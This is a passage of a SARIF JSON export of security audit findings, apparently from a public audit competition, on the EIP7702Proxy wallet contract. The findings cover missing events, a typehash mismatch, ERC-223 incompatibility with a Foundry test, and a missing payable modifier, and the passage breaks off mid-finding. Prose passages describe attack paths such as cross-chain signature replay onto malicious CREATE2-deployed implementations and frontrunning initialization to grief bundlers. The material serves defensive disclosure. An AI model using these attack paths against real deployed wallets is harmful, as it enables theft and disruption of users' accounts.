{"$schema": "https://json.schemastore.org/sarif-2.1.0.json", "version": "2.1.0", "runs": [{"tool": {"driver": {"name": "cantina_public_competition", "version": "1.0.0", "informationUri": "https://cantina.xyz/", "rules": [{"id": "c476f2b8-0ff5-4196-ad90-c0f988d26ce5", "name": "MissingEventEmissionAfterCritical", "shortDescription": {"text": "Missing event emission after critical setImplementation function invocation."}, "fullDescription": {"text": "## Summary\nMissing event emission after critical setImplementation function invocation.\n\n## Finding Description\n\nThe setImplementation method of the EIP7702Proxy contract updates the underlying ERC-1967 implementation address, which is a significant operation affecting the proxy's core logic. However, this method currently lacks any event emission upon successful execution:\n\n```\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // ... existing logic omitted for brevity ...\n\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n    \n    // No event emitted here\n}\n```\n\nNot emitting events for critical actions like setting or upgrading implementations breaks transparency and auditability. Without event logs, off-chain monitoring tools or indexers cannot easily detect these critical changes, making it significantly harder for users or third-party services to verify and track the proxy\u2019s implementation history.\n\n## Recommendation\nEmit a dedicated event after successful execution of setImplementation."}, "help": {"text": "## Summary\nMissing event emission after critical setImplementation function invocation.\n\n## Finding Description\n\nThe setImplementation method of the EIP7702Proxy contract updates the underlying ERC-1967 implementation address, which is a significant operation affecting the proxy's core logic. However, this method currently lacks any event emission upon successful execution:\n\n```\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // ... existing logic omitted for brevity ...\n\n    ERC1967Utils.upgradeToAndCall(newImplementation, callData);\n\n    bytes4 validationResult =\n        IAccountStateValidator(validator).validateAccountState(address(this), ERC1967Utils.getImplementation());\n    if (validationResult != ACCOUNT_STATE_VALIDATION_SUCCESS) revert InvalidValidation();\n    \n    // No event emitted here\n}\n```\n\nNot emitting events for critical actions like setting or upgrading implementations breaks transparency and auditability. Without event logs, off-chain monitoring tools or indexers cannot easily detect these critical changes, making it significantly harder for users or third-party services to verify and track the proxy\u2019s implementation history.\n\n## Recommendation\nEmit a dedicated event after successful execution of setImplementation."}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/104", "defaultConfiguration": {"level": "note"}}, {"id": "d055a3d9-1379-427b-982e-363ca9cb15ff", "name": "CrossChainReplayRisksIn", "shortDescription": {"text": "Cross-chain replay risks in setImplementation "}, "fullDescription": {"text": "## Description\n\nThe EIP7702Proxy contract includes an `allowCrossChainReplay` parameter in its `setImplementation()` function that, when set to true, removes chain ID validation from signature verification. While this feature enables convenient cross-chain functionality, it introduces a potential security risk that users should be aware of.\n\nWhen users deploy the same proxy across multiple chains and enable cross-chain replay, they may inadvertently authorize implementation addresses that are predictably deployed via CREATE2/CREATE3 factories. An attacker could then deploy malicious code at the same address on another chain, and the signature authorizing the implementation would be valid across all chains where the proxy is deployed.\n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n## Recommendation\n\nConsider one of the following approaches:\n\n1. Remove the `allowCrossChainReplay` option entirely, always including the chain ID in signature verification:\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n-   bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n-           allowCrossChainReplay ? 0 : block.chainid,\n+           block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n2. If cross-chain implementation setting must be supported, add clear documentation warning users about the potential risks and recommending they only use trusted implementations with strong security guarantees."}, "help": {"text": "## Description\n\nThe EIP7702Proxy contract includes an `allowCrossChainReplay` parameter in its `setImplementation()` function that, when set to true, removes chain ID validation from signature verification. While this feature enables convenient cross-chain functionality, it introduces a potential security risk that users should be aware of.\n\nWhen users deploy the same proxy across multiple chains and enable cross-chain replay, they may inadvertently authorize implementation addresses that are predictably deployed via CREATE2/CREATE3 factories. An attacker could then deploy malicious code at the same address on another chain, and the signature authorizing the implementation would be valid across all chains where the proxy is deployed.\n\n```solidity\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n    bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n            allowCrossChainReplay ? 0 : block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n## Recommendation\n\nConsider one of the following approaches:\n\n1. Remove the `allowCrossChainReplay` option entirely, always including the chain ID in signature verification:\n\n```diff\nfunction setImplementation(\n    address newImplementation,\n    bytes calldata callData,\n    address validator,\n    bytes calldata signature,\n-   bool allowCrossChainReplay\n) external {\n    // Construct hash using typehash to prevent signature collisions\n    bytes32 hash = keccak256(\n        abi.encode(\n            _IMPLEMENTATION_SET_TYPEHASH,\n-           allowCrossChainReplay ? 0 : block.chainid,\n+           block.chainid,\n            _proxy,\n            nonceTracker.useNonce(),\n            ERC1967Utils.getImplementation(),\n            newImplementation,\n            keccak256(callData),\n            validator\n        )\n    );\n    // ...\n}\n```\n\n2. If cross-chain implementation setting must be supported, add clear documentation warning users about the potential risks and recommending they only use trusted implementations with strong security guarantees."}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/102", "defaultConfiguration": {"level": "warning"}}, {"id": "6e05f421-dcb0-4de6-8784-0a7fbafc4a80", "name": "ImplementationSetTypehashUses", "shortDescription": {"text": "_IMPLEMENTATION_SET_TYPEHASH uses an incorrect type hash"}, "fullDescription": {"text": "## Description\n\nThe second to last variable in the type hash definition is `bytes callData` ([EIP7702Proxy.sol#L27](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L27)), however the code uses `keccak256(callData)` ([EIP7702Proxy.sol#L87](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L87)), which returns a `bytes32` (see [Solidity's documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#mathematical-and-cryptographic-functions)). As a result the typehash definition is incorrect\n\nThis does not have a direct impact on the smart contract, but can break third-party integration. In particular, given the large integration of coinbase's products, this can lead to breaking the user UI's verification of the signature and confuse the users\n\n## Recommendation\n\nChange `bytes callData` to `bytes32 callDataHash` in` _IMPLEMENTATION_SET_TYPEHASH`\n\n\n_(note: given the issue being straightforward, I did not provide a PoC, but I can if needed)_"}, "help": {"text": "## Description\n\nThe second to last variable in the type hash definition is `bytes callData` ([EIP7702Proxy.sol#L27](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L27)), however the code uses `keccak256(callData)` ([EIP7702Proxy.sol#L87](https://github.com/base/eip-7702-proxy/blob/371a141ed738a0328b356092a8df1bed0e1d9856/src/EIP7702Proxy.sol#L87)), which returns a `bytes32` (see [Solidity's documentation](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#mathematical-and-cryptographic-functions)). As a result the typehash definition is incorrect\n\nThis does not have a direct impact on the smart contract, but can break third-party integration. In particular, given the large integration of coinbase's products, this can lead to breaking the user UI's verification of the signature and confuse the users\n\n## Recommendation\n\nChange `bytes callData` to `bytes32 callDataHash` in` _IMPLEMENTATION_SET_TYPEHASH`\n\n\n_(note: given the issue being straightforward, I did not provide a PoC, but I can if needed)_"}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/59", "defaultConfiguration": {"level": "note"}}, {"id": "fcb149b5-dd5c-47d5-b17d-fdda7bf5fbc2", "name": "NonComplianceWithEip4337", "shortDescription": {"text": "Non-compliance with EIP-4337 excludes from existing AA infra, allows initialization frontrun griefing"}, "fullDescription": {"text": "## Summary\n\nA major motivation for [both EIP-7702](https://eips.ethereum.org/EIPS/eip-7702#forward-compatibility-with-future-account-abstraction) and [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#motivation) is to be maximally compliant with each other so that infrastructure and contracts will be used for both. EIP-7702 is intended primarily as a way to migrate EOA users to AA (EIP-4337). Indeed, the implementation intended to be used is the EIP-4337 CoinbaseSmartWallet, that relies on 4337 infrastructure for its functionality via `validateUserOp` etc.\n\nHowever, the current implementation of the **EIP7702Proxy** [is not compliant with the current version of EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#eip-7702-delegated-smart-contract-accounts):\n\n> **All** EIP-7702 delegated Smart Contract Account implementations **MUST** check that **all** calls to the initialization function originate from the\u00a0`entryPoint.senderCreator()`\u00a0address.\n\n## Finding Description\n\nThis view and requirement are in the 0.8 [EntryPoint release notes](https://github.com/eth-infinitism/account-abstraction/releases). It is explained to be a mitigation of a griefing vector (for user and bundlers) of frontrunning the initialization: in this case frontrunning a `setImplementation` if it's intended as an `initCode` action by the bundler.\n\n## Impact Explanation\n\nLow impacts:\n1. The main impact is non-compliance with a **MUST** of the EIP-4337 infrastructure's requiements. This may cause this proxy and their users to be excluded from being served by AA infrastructure, and thus being excluded from bundling, sponsored transactions, paymasters, user op mempool propagation, etc.  As a result, the proxy won't serve its purpose (of proxying an ERC-4337 imlementation) in which case users will need to migrate to a different EIP-7702 delegation.\n2. The frontrunning vector itself can grief any relayer / bundler (whether 4337 or not), since anyone's call to `setImplementation` (done as `initCode`) will revert if frontrun.\n\n## Likelihood Explanation\n\nHigh likelihood (non compliance with 4337 infrastructure).\n\n## Recommendation\n\nUse a default value for entry point's address to get the `senderCreator` address in the proxy before initialization. After initialization, delegate the view to the implementation (like it's done with `isSignatureValid`)."}, "help": {"text": "## Summary\n\nA major motivation for [both EIP-7702](https://eips.ethereum.org/EIPS/eip-7702#forward-compatibility-with-future-account-abstraction) and [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#motivation) is to be maximally compliant with each other so that infrastructure and contracts will be used for both. EIP-7702 is intended primarily as a way to migrate EOA users to AA (EIP-4337). Indeed, the implementation intended to be used is the EIP-4337 CoinbaseSmartWallet, that relies on 4337 infrastructure for its functionality via `validateUserOp` etc.\n\nHowever, the current implementation of the **EIP7702Proxy** [is not compliant with the current version of EIP-4337](https://eips.ethereum.org/EIPS/eip-4337#eip-7702-delegated-smart-contract-accounts):\n\n> **All** EIP-7702 delegated Smart Contract Account implementations **MUST** check that **all** calls to the initialization function originate from the\u00a0`entryPoint.senderCreator()`\u00a0address.\n\n## Finding Description\n\nThis view and requirement are in the 0.8 [EntryPoint release notes](https://github.com/eth-infinitism/account-abstraction/releases). It is explained to be a mitigation of a griefing vector (for user and bundlers) of frontrunning the initialization: in this case frontrunning a `setImplementation` if it's intended as an `initCode` action by the bundler.\n\n## Impact Explanation\n\nLow impacts:\n1. The main impact is non-compliance with a **MUST** of the EIP-4337 infrastructure's requiements. This may cause this proxy and their users to be excluded from being served by AA infrastructure, and thus being excluded from bundling, sponsored transactions, paymasters, user op mempool propagation, etc.  As a result, the proxy won't serve its purpose (of proxying an ERC-4337 imlementation) in which case users will need to migrate to a different EIP-7702 delegation.\n2. The frontrunning vector itself can grief any relayer / bundler (whether 4337 or not), since anyone's call to `setImplementation` (done as `initCode`) will revert if frontrun.\n\n## Likelihood Explanation\n\nHigh likelihood (non compliance with 4337 infrastructure).\n\n## Recommendation\n\nUse a default value for entry point's address to get the `senderCreator` address in the proxy before initialization. After initialization, delegate the view to the implementation (like it's done with `isSignatureValid`)."}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/55", "defaultConfiguration": {"level": "warning"}}, {"id": "832dd8ff-da0d-4dda-af97-fbb4a8502227", "name": "MissingTokenreceivedCallbackInEip7702proxy", "shortDescription": {"text": "Missing `tokenReceived` Callback in EIP7702Proxy Prevents ERC-223 Token Receipt Post-Upgrade"}, "fullDescription": {"text": "## Summary\nERC-223 token transfers to an EOA upgraded to a smart contract via EIP-7702 using the `EIP7702Proxy` will always revert because the proxy does not implement the required `tokenReceived` callback function, breaking compatibility with the ERC-223 standard and limiting token-handling capabilities post-upgrade.\n\n## Finding Description\nThe ERC-223 standard requires that any recipient running code\u2014whether a contract or an EOA with code\u2014implements the `tokenReceived` function to accept token transfers. This callback prevents accidental or incorrect deposits by ensuring the recipient can handle the tokens, as noted in discussions like [this Ethereum Magicians post](https://ethereum-magicians.org/t/eip-7702-set-eoa-account-code/19923/368). Without this function, an ERC-223 transfer reverts when the token contract attempts to call it.\nThe ERC-223 standard, as outlined in [EIP-223](https://github.com/ethereum/EIPs/issues/223), defines two `transfer` functions to enhance token transfer safety:\n1. `transfer(address _to, uint _value)`: A backwards-compatible version with ERC-20, which transfers tokens and invokes `tokenReceived(address, uint256, bytes)` on `_to` if it\u2019s a contract, reverting if the callback isn\u2019t implemented.\n2. `transfer(address _to, uint _value, bytes calldata _data)`: The primary function for ERC-223 transfers, which also invokes `tokenReceived` on `_to` if it\u2019s a contract, reverting if unimplemented, but skips the call if `_to` is an EOA (no code).\n\nPer the standard, a contract is identified by checking if `_to` has code (e.g., via `extcodesize`), and `tokenReceived` must be implemented by any contract recipient to accept tokens, preventing accidental deposits to incompatible contracts. If `_to` is an EOA (no code), the transfer proceeds without invoking `tokenReceived`.\n\n The proxy implements `onERC721Received` and `onERC1155Received` for ERC-721 and ERC-1155 compatibility but lacks `tokenReceived` for ERC-223. Post-upgrade, an EOA becomes a contract with code, so ERC-223 `transfer` calls will invoke `tokenReceived`. Since neither the proxy nor a typical implementation provides this function, the call fails, reverting the transfer.\n\nThis breaks the ERC-223 security guarantee that tokens are only sent to capable recipients. When an ERC-223 token contract executes a transfer:\n\nThe call to tokenReceived fails because neither the proxy nor a typical implementation includes it, causing the transfer to revert. This isn\u2019t an exploitable vulnerability but a compatibility gap that hinders the proxy\u2019s utility for ERC-223 token interactions post-EIP-7702 upgrade.\n\n## Impact Explanation\nThe absence of tokenReceived doesn\u2019t undermine the proxy\u2019s core security (initialization protection) or cause asset loss, but it prevents upgraded EOAs from receiving ERC-223 tokens via either transfer function when _to has code. This could disrupt wallet providers using EIP7702Proxy to upgrade EOAs into smart contract wallets, as users might expect support for ERC-223\u2014a standard designed for safer transfers. Post-Pectra, as EIP-7702 adoption grows, this gap could hinder interoperability with ERC-223 dApps, reducing the proxy\u2019s utility. It\u2019s not \u201cHigh\u201d impact since it\u2019s a compatibility issue, not a security flaw, but it\u2019s notable given the proxy\u2019s goal of enabling versatile wallets.\n\n## Likelihood Explanation\nWehn an EOA upgrades via EIP7702Proxy, it gains code, triggering the tokenReceived check in ERC-223 transfers. Without this callback, both transfer(address, uint) and transfer(address, uint, bytes) will revert when targeting the proxy. Given ERC-223\u2019s growing use for secure token handling and the proxy\u2019s intended role in smart contract wallets, this issue will likely manifest frequently post-upgrade, especially as wallet providers adopt EIP-7702.\n\n## Proof of Concept\n- Create a new `PoC.t.sol` file in the test folder and paste this\n```solidity\n    // SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\n// ERC-223 Token for testing\ncontract ERC223Token {\n    mapping(address => uint256) public balanceOf;\n\n    constructor() {\n        balanceOf[msg.sender] = 1000e18; // Mint initial supply\n    }\n\n    function transfer(address _to, uint _value, bytes calldata _data) public returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256,bytes)\", msg.sender, _value, _data)\n            );\n            require(success, \"Recipient rejected transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n\n    function transfer(address _to, uint _value) external returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256)\", msg.sender, _value)\n            );\n            require(success, \"Recipient rejected transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n}\n\ncontract CoinbaseSmartWalletValidatorTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    EIP7702Proxy _proxy;\n    CoinbaseSmartWallet _implementation;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _validator;\n    ERC223Token _token;\n\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public {\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        _implementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _validator = new CoinbaseSmartWalletValidator(_implementation);\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n        _token = new ERC223Token();\n\n        vm.etch(_eoa, address(_proxy).code);\n    }\n\n    // Existing tests omitted for brevity\n\n    function test_reverts_ERC223Transfer_afterUpgrade() public {\n        // Initialize proxy with an owner\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature =\n            _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_implementation), address(_validator));\n        EIP7702Proxy(_eoa).setImplementation(address(_implementation), initArgs, address(_validator), signature, true);\n\n        // Verify proxy has code (simulating EIP-7702 upgrade)\n        assertGt(_eoa.code.length, 0, \"EOA should have code after upgrade\");\n\n        // Attempt ERC-223 transfer\n        vm.prank(address(this)); // Token deployer has initial supply\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, \"\");\n\n        // Attempt ERC-223 transfer with data\n        vm.prank(address(this));\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, hex\"1234\");\n    }\n\n    // Helper functions from original suite\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    function _signSetImplementationData(\n        uint256 signerPk,\n        bytes memory initArgs,\n        address implementation,\n        address validator\n    ) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0,\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                address(implementation),\n                keccak256(initArgs),\n                address(validator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n}\n```\n- Run the test\n```bash\nforge test --mt test_reverts_ERC223Transfer_afterUpgrade\n```\n\n\n## Recommendation\nAdd tokenReceived to DefaultReceiver (since it handles token callbacks) to ensure ERC-223 support:"}, "help": {"text": "## Summary\nERC-223 token transfers to an EOA upgraded to a smart contract via EIP-7702 using the `EIP7702Proxy` will always revert because the proxy does not implement the required `tokenReceived` callback function, breaking compatibility with the ERC-223 standard and limiting token-handling capabilities post-upgrade.\n\n## Finding Description\nThe ERC-223 standard requires that any recipient running code\u2014whether a contract or an EOA with code\u2014implements the `tokenReceived` function to accept token transfers. This callback prevents accidental or incorrect deposits by ensuring the recipient can handle the tokens, as noted in discussions like [this Ethereum Magicians post](https://ethereum-magicians.org/t/eip-7702-set-eoa-account-code/19923/368). Without this function, an ERC-223 transfer reverts when the token contract attempts to call it.\nThe ERC-223 standard, as outlined in [EIP-223](https://github.com/ethereum/EIPs/issues/223), defines two `transfer` functions to enhance token transfer safety:\n1. `transfer(address _to, uint _value)`: A backwards-compatible version with ERC-20, which transfers tokens and invokes `tokenReceived(address, uint256, bytes)` on `_to` if it\u2019s a contract, reverting if the callback isn\u2019t implemented.\n2. `transfer(address _to, uint _value, bytes calldata _data)`: The primary function for ERC-223 transfers, which also invokes `tokenReceived` on `_to` if it\u2019s a contract, reverting if unimplemented, but skips the call if `_to` is an EOA (no code).\n\nPer the standard, a contract is identified by checking if `_to` has code (e.g., via `extcodesize`), and `tokenReceived` must be implemented by any contract recipient to accept tokens, preventing accidental deposits to incompatible contracts. If `_to` is an EOA (no code), the transfer proceeds without invoking `tokenReceived`.\n\n The proxy implements `onERC721Received` and `onERC1155Received` for ERC-721 and ERC-1155 compatibility but lacks `tokenReceived` for ERC-223. Post-upgrade, an EOA becomes a contract with code, so ERC-223 `transfer` calls will invoke `tokenReceived`. Since neither the proxy nor a typical implementation provides this function, the call fails, reverting the transfer.\n\nThis breaks the ERC-223 security guarantee that tokens are only sent to capable recipients. When an ERC-223 token contract executes a transfer:\n\nThe call to tokenReceived fails because neither the proxy nor a typical implementation includes it, causing the transfer to revert. This isn\u2019t an exploitable vulnerability but a compatibility gap that hinders the proxy\u2019s utility for ERC-223 token interactions post-EIP-7702 upgrade.\n\n## Impact Explanation\nThe absence of tokenReceived doesn\u2019t undermine the proxy\u2019s core security (initialization protection) or cause asset loss, but it prevents upgraded EOAs from receiving ERC-223 tokens via either transfer function when _to has code. This could disrupt wallet providers using EIP7702Proxy to upgrade EOAs into smart contract wallets, as users might expect support for ERC-223\u2014a standard designed for safer transfers. Post-Pectra, as EIP-7702 adoption grows, this gap could hinder interoperability with ERC-223 dApps, reducing the proxy\u2019s utility. It\u2019s not \u201cHigh\u201d impact since it\u2019s a compatibility issue, not a security flaw, but it\u2019s notable given the proxy\u2019s goal of enabling versatile wallets.\n\n## Likelihood Explanation\nWehn an EOA upgrades via EIP7702Proxy, it gains code, triggering the tokenReceived check in ERC-223 transfers. Without this callback, both transfer(address, uint) and transfer(address, uint, bytes) will revert when targeting the proxy. Given ERC-223\u2019s growing use for secure token handling and the proxy\u2019s intended role in smart contract wallets, this issue will likely manifest frequently post-upgrade, especially as wallet providers adopt EIP-7702.\n\n## Proof of Concept\n- Create a new `PoC.t.sol` file in the test folder and paste this\n```solidity\n    // SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.23;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {CoinbaseSmartWallet} from \"../lib/smart-wallet/src/CoinbaseSmartWallet.sol\";\nimport {EIP7702Proxy} from \"../src/EIP7702Proxy.sol\";\nimport {NonceTracker} from \"../src/NonceTracker.sol\";\nimport {DefaultReceiver} from \"../src/DefaultReceiver.sol\";\nimport {CoinbaseSmartWalletValidator} from \"../src/validators/CoinbaseSmartWalletValidator.sol\";\n\n// ERC-223 Token for testing\ncontract ERC223Token {\n    mapping(address => uint256) public balanceOf;\n\n    constructor() {\n        balanceOf[msg.sender] = 1000e18; // Mint initial supply\n    }\n\n    function transfer(address _to, uint _value, bytes calldata _data) public returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256,bytes)\", msg.sender, _value, _data)\n            );\n            require(success, \"Recipient rejected transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n\n    function transfer(address _to, uint _value) external returns (bool) {\n        require(balanceOf[msg.sender] >= _value, \"Insufficient balance\");\n        if (_to.code.length > 0) {\n            (bool success, ) = _to.call(\n                abi.encodeWithSignature(\"tokenReceived(address,uint256)\", msg.sender, _value)\n            );\n            require(success, \"Recipient rejected transfer\");\n        }\n        balanceOf[msg.sender] -= _value;\n        balanceOf[_to] += _value;\n        return true;\n    }\n}\n\ncontract CoinbaseSmartWalletValidatorTest is Test {\n    uint256 constant _EOA_PRIVATE_KEY = 0xA11CE;\n    address payable _eoa;\n    uint256 constant _NEW_OWNER_PRIVATE_KEY = 0xB0B;\n    address payable _newOwner;\n\n    EIP7702Proxy _proxy;\n    CoinbaseSmartWallet _implementation;\n    NonceTracker _nonceTracker;\n    DefaultReceiver _receiver;\n    CoinbaseSmartWalletValidator _validator;\n    ERC223Token _token;\n\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n    bytes32 _IMPLEMENTATION_SET_TYPEHASH = keccak256(\n        \"EIP7702ProxyImplementationSet(uint256 chainId,address proxy,uint256 nonce,address currentImplementation,address newImplementation,bytes callData,address validator)\"\n    );\n\n    function setUp() public {\n        _eoa = payable(vm.addr(_EOA_PRIVATE_KEY));\n        _newOwner = payable(vm.addr(_NEW_OWNER_PRIVATE_KEY));\n\n        _implementation = new CoinbaseSmartWallet();\n        _nonceTracker = new NonceTracker();\n        _receiver = new DefaultReceiver();\n        _validator = new CoinbaseSmartWalletValidator(_implementation);\n        _proxy = new EIP7702Proxy(address(_nonceTracker), address(_receiver));\n        _token = new ERC223Token();\n\n        vm.etch(_eoa, address(_proxy).code);\n    }\n\n    // Existing tests omitted for brevity\n\n    function test_reverts_ERC223Transfer_afterUpgrade() public {\n        // Initialize proxy with an owner\n        bytes memory initArgs = _createInitArgs(_newOwner);\n        bytes memory signature =\n            _signSetImplementationData(_EOA_PRIVATE_KEY, initArgs, address(_implementation), address(_validator));\n        EIP7702Proxy(_eoa).setImplementation(address(_implementation), initArgs, address(_validator), signature, true);\n\n        // Verify proxy has code (simulating EIP-7702 upgrade)\n        assertGt(_eoa.code.length, 0, \"EOA should have code after upgrade\");\n\n        // Attempt ERC-223 transfer\n        vm.prank(address(this)); // Token deployer has initial supply\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, \"\");\n\n        // Attempt ERC-223 transfer with data\n        vm.prank(address(this));\n        vm.expectRevert(\"Recipient rejected transfer\");\n        _token.transfer(_eoa, 100e18, hex\"1234\");\n    }\n\n    // Helper functions from original suite\n    function _createInitArgs(address owner) internal pure returns (bytes memory) {\n        bytes[] memory owners = new bytes[](1);\n        owners[0] = abi.encode(owner);\n        bytes memory ownerArgs = abi.encode(owners);\n        return abi.encodePacked(CoinbaseSmartWallet.initialize.selector, ownerArgs);\n    }\n\n    function _signSetImplementationData(\n        uint256 signerPk,\n        bytes memory initArgs,\n        address implementation,\n        address validator\n    ) internal view returns (bytes memory) {\n        bytes32 initHash = keccak256(\n            abi.encode(\n                _IMPLEMENTATION_SET_TYPEHASH,\n                0,\n                _proxy,\n                _nonceTracker.nonces(_eoa),\n                _getERC1967Implementation(address(_eoa)),\n                address(implementation),\n                keccak256(initArgs),\n                address(validator)\n            )\n        );\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, initHash);\n        return abi.encodePacked(r, s, v);\n    }\n\n    function _getERC1967Implementation(address proxy) internal view returns (address) {\n        return address(uint160(uint256(vm.load(proxy, _IMPLEMENTATION_SLOT))));\n    }\n}\n```\n- Run the test\n```bash\nforge test --mt test_reverts_ERC223Transfer_afterUpgrade\n```\n\n\n## Recommendation\nAdd tokenReceived to DefaultReceiver (since it handles token callbacks) to ensure ERC-223 support:"}, "helpUri": "https://cantina.xyz/code/b0a948cd-c861-4807-b36e-d680d82598bf/findings/44", "defaultConfiguration": {"level": "note"}}, {"id": "f0bf3745-f709-46bd-a159-ef37438c4260", "name": "ConsiderAddingPayableInSetimplementation", "shortDescription": {"text": "Consider adding payable in setImplementation function"}, "fullDescription": {"text": "## Summary\nThe `setImplementation` function lacks the payable modifier, which prevents the contract from sending ETH during an upgrade. This makes it impossible for the owner to call payable functions in the new implementation during the initialization call, thereby breaking potential call combinations that require ETH transfers.\n\n## Finding Description\nThe `setImplementation` function currently does not have the payable modifier, which means that when it calls `upgradeToAndCall`, it cannot transfer ETH. As a result:\n- Any new implementation that requires ETH during initialization cannot receive 